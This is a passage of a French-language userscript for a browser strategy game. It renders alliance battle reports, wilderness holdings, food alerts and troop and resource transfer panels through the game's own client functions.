  	     	  		  	m+='<TABLE class=ptTab cellpadding=3><TR><TD>Argent : </td><TD>'+addCommas(parseInt(rslt['loot'][0]))+'</td>';
  	     	  		  	m+='<TD>Nourriture : </td><TD>'+addCommas(parseInt(rslt['loot'][1]))+'</td>';
  	     	  		  	m+='<TD>Bois : </td><TD>'+addCommas(parseInt(rslt['loot'][2]))+'</td>';
  	     	  		  	m+='<TD>Pierre : </td><TD>'+addCommas(parseInt(rslt['loot'][3]))+'</td>';
  	     	  		  	m+='<TD>Fer : </td><TD>'+addCommas(parseInt(rslt['loot'][4]))+'</td>';
  	     	  		  	if (rslt['loot'][5]) {
  	     	  		  	m+='<tr><td>Objet trouv&eacute;:</td>';
  	     	  		  	for (var i=1;i<10;i++) {
  	     	  		  	
  	     	  		  	 if (rslt['loot'][5]['110'+i]==1)
  	     	  		  	  m+='<td colspan=3>' + unsafeWindow.arStrings.itemName["i110"+i] + '<div class="item-icon pic px70 items item_110'+i+'"></td>';
  	     	  		  	}
  	     	  		      }
  	     	  		  	m+='</tr></table>';
  	  	}
  	   
  	  	if (rslt['rsc'] != undefined) {
  	    		  	m+='<TABLE class=ptTab cellpadding=3><tr><td colspan=4><b><u>Ressources :</u></b><br></tr><TR>';
  	    		  	if (rslt['gld']!= undefined) m+='<TD>Argent : </td><TD>'+addCommas(parseInt(rslt['gld']))+'</td>';
  	    		  	m+='<TD>Nourriture : </td><TD>'+addCommas(parseInt(rslt['rsc']['r1']))+'</td>';
  	    		  	m+='<TD>Bois : </td><TD>'+addCommas(parseInt(rslt['rsc']['r2']))+'</td>';
  	    		  	m+='<TD>Pierre : </td><TD>'+addCommas(parseInt(rslt['rsc']['r3']))+'</td>';
  	    		  	m+='<TD>Fer : </td><TD>'+addCommas(parseInt(rslt['rsc']['r4']))+'</td></table>';
    		}
  	   m+="<br><br></table>";
  	  	 
    	}
    
      	t.popReport.getMainDiv().innerHTML = '<DIV style="max-height:520px; height:520px; overflow-y:scroll">' + m + '</div>';
      	t.popReport.getTopDiv().innerHTML = '<TD align="center"><B>Rapport de Bataille - '+unsafeWindow.formatDateByUnixTime(Date1)+'</td>';
      	t.popReport.show(true);
      	
      	
      	
    },
    DisplayReports : function (){
      var t = my.Hud;
      var data = t.data;
      var filtre =  document.getElementById("idHudTypeSearch").value;
      var filtre2 =  document.getElementById('idHudMedSearch').value;
      var results=document.getElementById("hudResultsDiv");
      if(!t.data.length) {
         results.innerHTML = '<center><b>Aucun rapport de trouv&eacute;.</b></center>';
         return;
      }
      var m = '<center><table width=100% cellspacing=0 cellpadding=3><thead><th>Page</th><th>R.</th><th>Date</th><th colspan=3>Attaquant</th><th>Type</th><th colspan=4>Destination</th></thead>';
      m += '<tbody>';
      for ( var i=0; i<t.data.length;i++) {
         var rpt = data[i];
         if (rpt.side0Name===undefined) 
            continue;
            
          style='padding:2px;' ; 
          if (rpt.TypeName=="Ent") {
             style=' style="background-color:#EF9999;padding:2px;"';
          }
           if (rpt.TypeName=="Ren") {
  	   style=' style="background-color:#99EF99;padding:2px;"';
          }
  
          if (((filtre2=="" || filtre2=="1" && (rpt.side1Name==Seed.player.name|| rpt.side0Name==Seed.player.name))) && (filtre=="" || (filtre=="0" && rpt.TypeName=="Ent") || (filtre=="1" && rpt.TypeName=="Sor") || (filtre=="2" && rpt.TypeName=="Ren"))) {
          
          
          m += '<tr ><td '+style+'><SPAN onclick="ptAllianceReports('+rpt.page+')"> <a>'+rpt.page+'</a></span></td>\
           <td '+style+'>';
          if (rpt.marchType == 3 && rpt.TypeName=="Ent") {
          } else {

           m+='<img onclick="getReport('+rpt.reportUnixTime+','+ rpt.marchReportId +','+rpt.side0TileType +',\''+rpt.TypeName+'\',\''+rpt.side1Name.replace(/\'/g,"_")+'\',\''+ rpt.side1XCoord +','+ rpt.side1YCoord +'\',\''+rpt.side0Name.replace(/\'/g,"_")+'\',\''+ rpt.side0XCoord +','+ rpt.side0YCoord +'\');" border=0 src="http://cdn1.iconfinder.com/data/icons/woothemesiconset/16/search_button.png">';
          }
          m+='&nbsp;</td>\
            <td '+style+'>'+unsafeWindow.formatDateByUnixTime(rpt.reportUnixTime)+'</td>\
              <td '+style+'>'+rpt.side1Name+'</td>\
              <td '+style+'>'+rpt.side1AllianceName.replace('unaligned','-')+'</td>\
              <td '+style+'><a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ rpt.side1XCoord +','+ rpt.side1YCoord +')" class="coordinateLink">('+ rpt.side1XCoord +','+ rpt.side1YCoord +')</a></td>';
              if (rpt.marchType == 3) 
               m +='<TD '+style+'><FONT color="FF9933">'+rpt.marchName+'</font></td>';
  	    else if (rpt.marchType == 4) 
  	     m +='<TD '+style+'><FONT color="FF0033">'+rpt.marchName+'</font></td>';
  	    else 
  	      m +='<TD '+style+'><FONT color="339933">'+rpt.marchName+'</font></td>';
  	      if (rpt.side0Name!=undefined) {
               m+='<td '+style+'>'+rpt.side0Name+'</td>';
              }else{
               m+='<td '+style+'>-</td>';
              }
              m+='<td '+style+'>'+rpt.side0AllianceName.replace('unaligned','-')+'</td>\
              <td '+style+'><a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ rpt.side0XCoord +','+ rpt.side0YCoord +')" class="coordinateLink">('+ rpt.side0XCoord +','+ rpt.side0YCoord +')</a></td>';
              if (rpt.side0TileType < 51 && rpt.side0TileLevel!=undefined) {
              m+='<td '+style+'>TS '+rpt.side0TileLevel+'</td>';
              } else {
                if (rpt.side0TileType = 51 && rpt.side0CityId==0 && rpt.side0PlayerId==0) {
                  m+='<td '+style+'>CB</td>';
                  }else {
                  m+='<td '+style+'>Ville</td>';
                  }
              }
              
              m+='</tr>';
          }
      }
      m += '</tbody></table></center>';
      results.innerHTML = m;
  },
  handleHudSearchCB : function(rslt, page) {
      var t = my.Hud;
      if (rslt) {
         if (!rslt.ok) {
            document.getElementById("idSpanHudErrorMsg").innerHTML = rslt.errorMsg;
            return;
         }
         t.totalPages=parseInt(rslt.totalPages);
         if (t.totalPages < t.maxPages)
	    t.maxPages = t.totalPages;
         if (rslt.arReports && page) {
           var ar = rslt.arReports;
           var rptkeys = unsafeWindow.Object.keys(ar);
           var myAllianceId = getMyAlliance()[0];
           for (var i = 0; i < rptkeys.length; i++) {
                var rpt = ar[rptkeys[i]];
                rpt.page = page;     
                var side0Name = rslt.arPlayerNames['p'+rpt.side0PlayerId];
                rpt.side0Name = side0Name;
                rpt.side1Name = rslt.arPlayerNames['p'+rpt.side1PlayerId];
                if (rpt.side0AllianceId > 0)
                  rpt.side0AllianceName = rslt.arAllianceNames['a'+rpt.side0AllianceId];
                else
                  rpt.side0AllianceName = 'unaligned';
                if (rpt.side1AllianceId > 0)
                  rpt.side1AllianceName = rslt.arAllianceNames['a'+rpt.side1AllianceId];
                else
                  rpt.side1AllianceName = 'unaligned';
  
                if (rpt.side0CityId > 0)
                  rpt.side0CityName = rslt.arCityNames['c'+rpt.side0CityId];
                else
                  rpt.side0CityName = 'aucun';
                if (rpt.side1CityId > 0)
                  rpt.side1CityName = rslt.arCityNames['c'+rpt.side1CityId];
                else
                  rpt.side1CityName = 'aucun';
                if (rpt.marchType == 1)
                    rpt.marchName = 'Transport';
                else if (rpt.marchType == 3)
                    rpt.marchName = 'Eclaireur';
                else if (rpt.marchType == 2)
                    rpt.marchName = 'Renfort';
                else if (rpt.marchType == 4)
                    rpt.marchName = 'Attaque';
                else rpt.marchName = 'unknown';
                
                rpt.targetDiplomacy = getDiplomacy (rpt.side0AllianceId);
             
                	
  	      if (myAllianceId != rpt.side1AllianceId) {      
  		rpt.TypeName = "Ent";
  	      }
                if (myAllianceId == rpt.side1AllianceId) {
       		rpt.TypeName = "Sor";      
       	      }
       	      
       	         	if (rpt.marchType == 2) {
       	         	  rpt.TypeName = "Ren"; 
       	         	}
       	      
       	      t.data.push(rpt); 
                   
           }
         }
         			
         
         if (parseInt(page)+1 <= t.maxPages) {
            var results=document.getElementById("hudResultsDiv");
            results.innerHTML = 'Recherche en cours de la page ' + (parseInt(page)+1) + ' sur ' + t.maxPages;
            t.getAllianceReports(parseInt(page)+1);
         }
         else if (page) 
             t.DisplayReports();
      }
    },
    
    handleHudSearch : function() {
      var t = my.Hud;
      var results=document.getElementById("hudResultsDiv");
      results.innerHTML = 'Recherche en cours page ' + t.minPages + ' sur ' + t.maxPages;
      t.data=[];
      t.getAllianceReports(t.minPages);
    },
  
    getAllianceReports : function (pageNum){
      var t = my.Hud;
      var c= {};
      c.pageNo = pageNum;
      c.group = "a";

      unsafeWindow.AjaxCall.gPostRequest("listReports.php",c,
        function(rslt){
           t.handleHudSearchCB (rslt, pageNum);     
        },
        function (rslt) {
            t.handleHudSearchCB (rslt, pageNum);     
        }
      );
    },
  
    hide : function (){
  },
  
  }
 
 
 /******** REGIONS SAUVAGES ***********/
my.Wilds = {
  cont : null,
  state : null,
  upGoldTimer : null,
  wildList : [],
  buildList : {},
  
  init : function (){
    var t = my.Wilds;
    t.cont = document.createElement('div');
     unsafeWindow.BOTerres = t.show;
    return t.cont;
  },

  getContent : function (){
    var t = my.Wilds;
    return t.cont;
  },

  hide : function (){
    var t = my.Wilds;

  },
  
  show : function (){
    var t = my.Wilds;
    clearTimeout (t.displayTimer);
    if (t.state == null){
      t.cont.innerHTML = '<DIV id=wildContent style="height:620px; max-height:620px; overflow-y:auto">';
      t.state = 1;
    }
    m = "<DIV class=ptstat>"+unsafeWindow.arStrings.Common["Wilds"]+"</div>";

    for (var c=0; c<Cities.numCities; c++){
          var city = Cities.cities[c]; 
          var row = 0;  
          var position = "right";
          if ((c+1)%2) position="left";
              m += '<TABLE cellspacing=0 cellpadding=0 class=ptTabPad width=45% style="float:'+position+'">';
          m += '<TR><TD colspan=20><DIV class=ptstat>'+ city.c.name +' &nbsp; <a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ city.c.x +','+ city.c.y+');">('+ city.c.x +','+ city.c.y +')</a></div></td></tr>';
         
          if(city.c.wildernessCount()===0){
          
          }else {
            m += '<TR style="background-color:white; font-weight:bold;" align=right><TD align=left>'+unsafeWindow.arStrings.Common.Abandon+'</td><TD align=left>Type</td><td align=left>'+unsafeWindow.arStrings.Common.Level+'</td><TD align=left>'+unsafeWindow.arStrings.Common.Coordinates+'</td></tr>';
             city.c.wilderness().each(function(wild)
	    {
	     m += '<TR align=right'+ (row++%2?'':' class=ptOddrow') +'><TD align=left>\
	     <a onclick="this.style.display=\'none\';setTimeout (function (){Castle.abandonWild('+wild.id+');setTimeout(function() { BOTerres() },1000); },500);return false;"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0></a></td><td align=left>'+wild.name +'</td>\
             <TD>'+ wild.level +'</td><TD align=center><a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+wild.x +','+  wild.y+');">('+ wild.x +','+ wild.y +')</a></td></tr>';     
	    });    
      	  }
      	  m+="</table>";
      }
     document.getElementById('wildContent').innerHTML = m + '</div>';
     t.displayTimer = setTimeout (t.show, 20000);
  },
   
}

/************************ Food Alerts *************************/
var FoodAlerts = {

  init : function (){
   var f = FoodAlerts;
   f.e_eachMinute();
  },

  minuteTimer : null,

  e_eachMinute : function (){   
    var f = FoodAlerts;
    var now = unixTime();
    row = [];  
    if (Options.enableFoodWarnTchat)  {
      for(i=0; i < Cities.numCities; i++) {
        //var rp = getResourceProduction (Cities.cities[i].id);
        var foodleft = parseInt(Cities.cities[i].c.resources[1].count);
        var usage = parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) - parseInt(Cities.cities[i].c.upkeep());
        //row[i] = rp[1] - usage;
        
    	var timeLeft = parseInt(Cities.cities[i].c.resources[1].count)  / (0-usage) * 3600;
          var msg = '';
          if (timeLeft<0){
           }
          else if (timeLeft<(Options.foodWarnHours*3600)) {
                msg += 'Ma ville ' + Cities.cities[i].c.name.substring(0,10) + ' (' +
                       Cities.cities[i].c.x +','+ Cities.cities[i].c.y + ') ';
              msg += ' a besoin de bananes. Stock actuel : '+addCommasWhole(foodleft).replace(',',' ').replace(',',' ').replace(',',' ').replace(',',' ')+' ('+timestrShort(timeLeft)+') Production : '+addCommas(usage).replace(',',' ').replace(',',' ').replace(',',' ').replace(',',' ')+'/h';
                sendChat ("/a " + msg);
                //alert(msg);
          }
      }  
    f.minuteTimer = setTimeout (f.e_eachMinute, 1800000);
   }
  },  
}

function sendChat (msg){
  document.getElementById ("mod_comm_input").value = msg;
  unsafeWindow.Chat.sendChat ();
}



/*************** REASSIGNER **********/
my.Reassign = {
 cont : null,
 displayTimer : null,
 state : null,
 curTabBut : null,
 curTabName : null,
 sourceCity : {},
 destinationCity : {},
 rows : [],

 init : function (){
   var t = my.Reassign;
   t.cont = document.createElement('div');
   t.state = null;
   return t.cont;
 },
  getContent : function (){
    var t = my.Reassign;
    return t.cont;
  },
  hide : function (){
    var t = my.Reassign;
    t.state = null;
    clearTimeout (t.displayTimer);
  },
  
  show : function (){  
    var t = my.Reassign;
    var ModelCity = {};
    var rownum = 0;
    var rownum2 = 0;
    clearTimeout (t.displayTimer);
     
        if (t.state == null) {  
          m = "<DIV class=ptstat>"+unsafeWindow.arStrings.Common.Reassign+" des troupes</div>";
          m +="<div id='statpourREA'></div>";
          m += "<TABLE width='450px' class=ptTab border=0 align=left cellpadding=2>\
            <tr align=center valign=middle><td colspan=1 width=100><b><u>Source</b></u><br><span id=REAsrcRptspeedcity></span></td>\
            <td colspan=1 width='100px'><input type=button style='font-weight:bold' id=REAaction value='R&eacute;assigner'></td>\
            <td colspan=1 width='100px'><b><u>Destination</b></u><br><span id=REAdesRptspeedcity></span></td>\
            <td width=150 colspan=1>&nbsp;</td></tr>\
            <tr align=center valign=top><td width=100><div id=REAstatsource></div></td>\
            <td ><table cellspacing=0 cellpadding=0 width=99%>";
             for (r=1; r<32; r++){
              if (unsafeWindow.arStrings.unitName["u"+r]) {
             if (rownum++ % 2)
    	             style = '';
    	           else
                style = ' style = "background: #e8e8e8"';
    	     m += '<tr '+style+'><td  align=right>&nbsp;</td><td align=left><input style="border:1px solid black;height:16px;font-size:11px;" id="REAnbunit'+r+'" type=text size=7 value="0"></td></tr>';
       	     }
       	    }
            m += "</table></td><td><div id=REAstatdest></div></td>";
            m += "<td colspan=2><table cellspacing=0 cellpadding=0 width=80%><tr><td>&nbsp;</table>";

            m += "</tr><tr><td colspan=4><div id='ptREAStatus' style='text-align:center;overflow-y:auto; max-height:30px; height: 30px;'></div></td></tr></table>";
            
            
          t.cont.innerHTML = m; 
          t.statpourREA = document.getElementById ('statpourREA');
          t.statutREA = document.getElementById ('ptREAStatus');
          t.actionREA = document.getElementById ('REAaction');
          t.actionREA.addEventListener ('click', t.clickReassigneDo, false);
          
       
          
          var dcp1 = new CdispCityPicker ('ptREA1', document.getElementById('REAdesRptspeedcity'), false, t.clickREACityDestinationSelect, 1);
          var dcp0 = new CdispCityPicker ('ptREA0', document.getElementById('REAsrcRptspeedcity'), false, t.clickREACitySourceSelect, Cities.byID[unsafeWindow.currentcityid].idx);
          t.state = 1;
         
         }
         var str = "<TABLE class=ptTabLined cellspacing=0><TR valign=top align=right><TD width=120></td><TD width=88 style='background: #ffc'><B>TOTAUX</b></td>";
	    for(i=0; i<Cities.numCities; i++) {
	      Gate = Cities.cities[i].c.defending;
	               if(Gate == 0) var couleurr="#77EE77";
	               if(Gate != 0) var couleurr="#EE7777";
	                 str += "<TD width=81 style='background-color:"+couleurr+"' align=center><B>"+ Cities.cities[i].c.name +'</b><BR><a onclick="KB.Controllers.MapHelper.gotoCoord('+Cities.cities[i].c.x +','+ Cities.cities[i].c.y+');">('+Cities.cities[i].c.x +','+ Cities.cities[i].c.y+')</A></td>';
	                 
	    }
	str +="</tr>";
        str += "<tr><td><br></td></tr>";

      
	 for (r=1; r<32; r++){
	      var unitTotal=0;
	   var m="";
	   if (unsafeWindow.arStrings.unitName["u"+r]) {
	      style = " style = 'background: #e8e8e8'";
	      for(var i=0; i<Cities.numCities; i++) {
		   m += "<TD width=81 "+style+" align=right>"+ addCommas(Cities.cities[i].c.troops[r].count()) +'</td>';
		 	                        unitTotal+=parseInt(Cities.cities[i].c.troops[r].count());
	       }
		          str += "<tr><td "+style+" align=right><b>"+unsafeWindow.arStrings.unitName["u"+r]+"</td><td "+style+" align=right>"+addCommas(unitTotal)+" "+ m + "</tr>"; 
	
	
	    }
	 }
        t.statpourREA.innerHTML = str;       
        t.displayTimer = setTimeout (t.show, 10000);
         
         
    
 },
   clickREACitySourceSelect : function (city){
    var t = my.Reassign;
    var rownum=0;
    t.sourceCity = city; 
    // on remplit les stat du DIV source
    //on efface le nbunit
    for (r=1; r<32; r++){
      if (ById("REAnbunit"+r))  ById("REAnbunit"+r).value="0";
    }
    t.actionREA.disabled=false;
    var m="";
    m="<table cellspacing=0 cellpadding=0 width=80%>";
    for (r=1; r<32; r++){  
     if (unsafeWindow.arStrings.unitName["u"+r]) {
        if (rownum++ % 2)
    	            style = '';
    	          else
             style = 'background: #e8e8e8;';
      m += '<tr style="'+style+'"><td align=right><b>'+unsafeWindow.arStrings.unitName["u"+r]+'</b></td>\
            <td align=left><input style="border:1px solid black;height:16px;font-size:11px;" id="REAdestunit'+r+'" type=text size=7 readonly value="'+parseInt(Cities.cities[t.sourceCity.idx].c.troops[r].count())+'">&nbsp;\
            <input type=button value=">" id="REApdestunit'+r+'"  style="border:1px solid black;height:16px;font-size:11px;"></td></tr>';
     }
    }
    m += "</table>";
 
    ById("REAstatsource").innerHTML = m;
    
    for (r=1; r<32; r++){
      if (unsafeWindow.arStrings.unitName["u"+r]) {
      
      ById("REApdestunit"+r).addEventListener ('click', function() {
      
        
        var nomcha=this.id.replace("REApdest","REAdest");
        var nomcha2=this.id.replace("REApdestunit","REAnbunit");
      
        ById(nomcha2).value=0; // on met à 0
        var maxtroupe=200000;
        var nbunitto=0;
        for (r=1; r<32; r++) {
          if (ById("REAnbunit"+r))      nbunitto+=parseInt(ById("REAnbunit"+r).value);
        }

        var libre = parseInt(maxtroupe - nbunitto);

        if (ById(nomcha).value>=libre) {
          ById(nomcha2).value = libre;
        }  else {
          ById(nomcha2).value= ById(nomcha).value;
        }
  
        
        
       }, false);
       }
    }
   // t.estimerTemps();
  },
  clickREACityDestinationSelect : function (city){
     var t = my.Reassign;
     var rownum=0;
     t.destinationCity = city;
     
     // on remplit les stat du DIV destination
     var m="";
     m="<table cellspacing=0 cellpadding=0 width=80%>";
     for (r=1; r<32; r++){
      if (unsafeWindow.arStrings.unitName["u"+r]) {
        if (rownum++ % 2)
    	            style = '';
    	          else
             style = 'background: #e8e8e8;';

          m += '<tr style="'+style+'"><td align=right>&nbsp;</td><td align=left><input style="border:1px solid black;height:16px;font-size:11px;" type=text size=7 readonly value="'+parseInt(Cities.cities[t.destinationCity.idx].c.troops[r].count())+'"></td></tr>';
      }
     }
     m += "</table>";
     ById("REAstatdest").innerHTML = m;
    // t.estimerTemps();
  },  
  clickReassigneDo: function() {
  var t = my.Reassign;
     var totalunit=0;
        var SourceId = t.sourceCity.c.id;
        
        var DestinationId = t.destinationCity.c.id;
     
   //nHtml.Click(document.getElementById("city_"+SourceId));
   unsafeWindow.KB.AudioManager.playSound('on_click');
   unsafeWindow.Chrome.City.switchTo(SourceId);
   
   
     // faire les test d'unité !
     for (r=1; r<32; r++){
       if (document.getElementById("REAnbunit"+r)) {
       
         if (parseInt(document.getElementById("REAnbunit"+r).value) > parseInt(document.getElementById("REAdestunit"+r).value)) {
           document.getElementById("REAnbunit"+r).style.backgroundColor="red";
           return false;
         
         }
         totalunit=totalunit+parseInt(document.getElementById("REAnbunit"+r).value);
         document.getElementById("REAnbunit"+r).style.backgroundColor="";
        }
     }
     
     if (t.sourceCity.c.id==t.destinationCity.c.id) {
           t.statutREA.innerHTML = '<FONT COLOR=#550000>Impossible sur les memes villes !.</font>';
          return;
     }
     if (totalunit==0) {
        t.statutREA.innerHTML = '<FONT COLOR=#550000>Impossible de reassigner avec 0 unit&eacute;e... pfff !.</font>';
          return;
   }

      var maxtroupe=200000;

      if (totalunit>maxtroupe) {
       t.statutREA.innerHTML = '<FONT COLOR=#550000>Impossible de reassigner plus de '+maxtroupe+' unit&eacute;es a la fois.</font>';
       return;
      }
      
      t.actionREA.disabled=true;
      var x=t.destinationCity.c.x;
      var y=t.destinationCity.c.y;
     t.statutREA.innerHTML = "<i><b>En cours de traitement....</b></i>";
      setTimeout(function() {
     unsafeWindow.Modal.hideModalAll();
     unsafeWindow.March.open(5,x,y);
    
     setTimeout(function() {
      for (r=1; r<32; r++){
       if (document.getElementById("REAnbunit"+r) && document.getElementById("REAnbunit"+r).value>0) {
        if (document.getElementById("modal_attack_unit_ipt_"+r) !==null) 
         document.getElementById("modal_attack_unit_ipt_"+r).value=parseInt(document.getElementById("REAnbunit"+r).value);
         unsafeWindow.March.TroopList.save(r, document.getElementById("modal_attack_unit_ipt_"+r));
	 unsafeWindow.March.checkTroopInput(document.getElementById("modal_attack_unit_ipt_"+r), r, true);

        }
       }
      unsafeWindow.March.check(5);
     
      t.statutREA.innerHTML ="<font color=red size='3px'><b>Effectu&eacute;<b></font>";
      t.actionREA.disabled=false; 
     
     },1000);
   },200);
   
   
  },

}

// returns {count, maxlevel}
function getCityBuilding (cityId, buildingId){
  var b = Seed.buildings['city'+cityId];
  var ret = {count:0, maxLevel:0};
  for (var i=1; i<33; i++){
    if (b['pos'+i] && b['pos'+i][0] == buildingId){
      ++ret.count;
      if (parseInt(b['pos'+i][1]) > ret.maxLevel)
        ret.maxLevel = parseInt(b['pos'+i][1]);
    }
  }
  return ret;
}

/*************** TRANSPORT **********/
my.TranspAuto = {
 cont : null,
 displayTimer : null,
 state : null,
 curTabBut : null,
 curTabName : null,
 sourceCity : {},
 destinationCity : {},
 rows : [],

 init : function (){
   var t = my.TranspAuto;
   t.cont = document.createElement('div');
   t.state = null;
     clearTimeout (t.displayTimer);
   return t.cont;
 },
  getContent : function (){
    var t = my.TranspAuto;
    return t.cont;
  },
  hide : function (){
    var t = my.TranspAuto;
    t.state = null;
    clearTimeout (t.displayTimer);
  },
  
  show : function (){  
   var t = my.TranspAuto;
   var rownum = 0;

   var ModelCity = {};
   

    if (t.state == null) {  
      m = "<DIV class=ptstat>Transporter des marchandises d'une ville a une autre</div>";
      m +="<div id='statpourTr'></div>";
      m += "<TABLE width=100% class=ptTab border=0 cellpadding=3>\
       <tr align=center><td colspan=2><HR></td></tr>\
       <tr align=center valign=top><td colspan=1 width=50%><b><u>Source</b></u><br><span id=srcptspeedcity></span></td>\
       <td colspan=1 width=50%  rowspan=2><b><u>Destination</b></u><br><span id=desptspeedcity></span><br>\
       Ou des coordonn&eacute;es <br>X: <input type=text size=4 id=typetrpx value=0>&nbsp;Y: <input type=text size=4 id=typetrpy value=0><br><br><INPUT id='ptttButTransport' type=submit value='Transporter' style='font-weight:bold'>\
       </td></tr>\
       <tr align=center><td colspan=1>Unit&eacute : <select id=typetrp><option value='1'>"+unsafeWindow.arStrings.unitName["u1"]+"</option><option value='2'>"+unsafeWindow.arStrings.unitName["u2"]+"</option><option value='4'>"+unsafeWindow.arStrings.unitName["u4"]+"</option><option value='5'>"+unsafeWindow.arStrings.unitName["u5"]+"</option><option value='6'>"+unsafeWindow.arStrings.unitName["u6"]+"</option><option value='7'>"+unsafeWindow.arStrings.unitName["u7"]+"</option><option value='8'>"+unsafeWindow.arStrings.unitName["u8"]+"</option><option selected value='9'>"+unsafeWindow.arStrings.unitName["u9"]+"</option><option value='10'>"+unsafeWindow.arStrings.unitName["u10"]+"</option><option value='11'>"+unsafeWindow.arStrings.unitName["u11"]+"</option><option value='12'>"+unsafeWindow.arStrings.unitName["u12"]+"</option></select>\
       <br>Quantit&eacute; : <input type=text size=6 value='100' id='Choixnbwagon'><input type=button id='trswagmax' value='Max'\><br><i>(la quantit&eacute de ressource est le maximun des unit&eacute;s choisies)</i>\
       <br><b>Type de ressource :</b><br><input type=radio id='ChoixRess0' name='ChoixRess' value='gold'> " + unsafeWindow.arStrings.ResourceName[0] + "\
       <input type=radio id='ChoixRess1' name='ChoixRess' value='rec1'> " + unsafeWindow.arStrings.ResourceName[1] + "\
       <input type=radio id='ChoixRess2' name='ChoixRess' value='rec2'> " + unsafeWindow.arStrings.ResourceName[2] + "\
       <input type=radio id='ChoixRess3' name='ChoixRess' value='rec3'> " + unsafeWindow.arStrings.ResourceName[3] + "\
       <input type=radio id='ChoixRess4' name='ChoixRess' value='rec4'> " + unsafeWindow.arStrings.ResourceName[4] + "\
       </td></tr>\
       <tr><td colspan=2>"+ unsafeWindow.arStrings.March.ResourcesToSend +" : <span id=BOEstimationR></td></tr>\
       </table>\
       <TABLE align=center width=100% class=ptTab><TR><TD><div id=ptTranportStatus style='text-align:center;overflow-y:auto; max-height:78px; height: 78px;'></div></td></tr></table>";
    t.cont.innerHTML = m; 
    t.destinationCityx = document.getElementById ('typetrpx');
    t.destinationCityy = document.getElementById ('typetrpy');
    
    t.destinationCityx.addEventListener ('change', t.estimerRes, false);
    t.destinationCityy.addEventListener ('change', t.estimerRes, false);
    document.getElementById ('ChoixRess0').addEventListener ('click', t.estimerRes, false);
    document.getElementById ('ChoixRess1').addEventListener ('click', t.estimerRes, false);
    document.getElementById ('ChoixRess2').addEventListener ('click', t.estimerRes, false);
    document.getElementById ('ChoixRess3').addEventListener ('click', t.estimerRes, false);
    document.getElementById ('ChoixRess4').addEventListener ('click', t.estimerRes, false);
    
    t.estimationRes = document.getElementById ('BOEstimationR');
    var dcp1 = new CdispCityPicker ('ptspeed1', document.getElementById('desptspeedcity'), false, t.clickCityDestinationSelect, 1);
    t.TTbutTransport = document.getElementById ('ptttButTransport');
    t.TTbutTransport.addEventListener ('click', t.clickTransportDo, false);
    t.divTranportStatus = document.getElementById ('ptTranportStatus');
    t.statpourTr = document.getElementById ('statpourTr');
    t.typetrp = document.getElementById ('typetrp');
    t.typetrp.addEventListener ('click', t.estimerRes, false); 
    t.trswagmax = document.getElementById ('trswagmax');
    t.trswagmax.addEventListener ('click', t.clickUniteMax, false);
    t.Choixnbwagon  = document.getElementById ('Choixnbwagon');
    t.Choixnbwagon.addEventListener ('keyup', t.verifierWagons, false);
    var dcp0 = new CdispCityPicker ('ptspeed0', document.getElementById('srcptspeedcity'), false, t.clickCitySourceSelect, Cities.byID[unsafeWindow.currentcityid].idx);
    t.state = 1;
   }

   str = "<TABLE class=ptTabLined cellspacing=0><TR valign=top align=right><TD width=65></td><TD width=88 style='background: #ffc'><B>TOTAL</b></td>";
   for(i=0; i<Cities.numCities; i++) {
     Gate = Cities.cities[i].c.defending;
              if(Gate == 0) var couleurr="#77EE77";
              if(Gate != 0) var couleurr="#EE7777";
                str += "<TD width=81 style='background-color:"+couleurr+"' align=center><B>"+ Cities.cities[i].c.name +'</b><BR><a onclick="KB.Controllers.MapHelper.gotoCoord('+Cities.cities[i].c.x +','+ Cities.cities[i].c.y+');">('+Cities.cities[i].c.x +','+ Cities.cities[i].c.y+')</td>';
                
   }
   str +="</tr>";
   str += "<tr><td><br></td></tr>";
   var m="";
          var goldTotal=0;
          for(i=0; i<Cities.numCities; i++) {
                      m += "<TD width=81 style='background:#e8e8e8' align=right>"+ addCommas(Cities.cities[i].c.silver()) +'</td>';
                      goldTotal+=parseInt(Cities.cities[i].c.silver());
           }
          str += "<tr align=right><td style='background:#e8e8e8' align=right><b>" + unsafeWindow.arStrings.ResourceName[0] + "</td><td style='background:#e8e8e8' align=right>"+addCommas(goldTotal)+" "+ m + "</tr>" ; 
          
                   
            for (var nbr=1; nbr<=4; nbr++) {
                 if (nbr % 2)
    		        style = '';
    	     else
                        style = " style = 'background: #e8e8e8'";
                var m="";
                var resTotal=0;
                for(var i=0; i<Cities.numCities; i++) {
                            m += "<TD width=81 "+style+" align=right>"+ addCommas(Cities.cities[i].c.resources[nbr].count) +'</td>';
                            resTotal+=parseInt(Cities.cities[i].c.resources[nbr].count);
                 }
                str += "<tr><td "+style+" align=right><b>"+unsafeWindow.arStrings.ResourceName[nbr]+"</td><td "+style+" align=right>"+addCommas(resTotal)+" "+ m+"</tr>"; 
          
      
            
              }
             str += "<tr><td><br></td></tr>";
            // Production de nourriture + ENTRETIEN !
            var m="";
    	var prodTotal=0;
    	for(i=0; i<Cities.numCities; i++) {
    	           m += "<TD align=right width=81 style='background:#e8e8e8'>"+ addCommas(Cities.cities[i].c.resources[1].hourlyTotalRate())+"/"+unsafeWindow.arStrings.TimeStr.timeHr+"</td>";
    	          prodTotal+=parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate());
    	}
            str += "<tr><td style='background: #e8e8e8' align=right><b>"+unsafeWindow.arStrings.Common.Production+"</td><td style='background: #e8e8e8' align=right>"+addCommas(prodTotal)+"/"+unsafeWindow.arStrings.TimeStr.timeHr+""+ m+"</tr>"; 
            var m="";
    	var entTotal=0;
     	for(i=0; i<Cities.numCities; i++) {
     	       color='black';
     	      // if ( parseInt(Cities.cities[i].c.resources[1].hourlyTotalRate()) < Cities.cities[i].c.upkeep() ) color='red';
    	       m += "<TD align=right width=81 style='background:#e8e8e8;color:"+color+";'>"+ addCommas(Cities.cities[i].c.upkeep())+"/"+unsafeWindow.arStrings.TimeStr.timeHr+"</td>";
    	       entTotal+=parseInt(Cities.cities[i].c.upkeep());
    	}
            str += "<tr><td style='background: #e8e8e8' align=right><b>"+unsafeWindow.arStrings.Common.UpKeep+"</td><td style='background: #e8e8e8' align=right>"+addCommas(entTotal)+"/"+unsafeWindow.arStrings.TimeStr.timeHr+""+ m+"</tr>"; 
    
            var m="";
    	 	var entTotal=0;
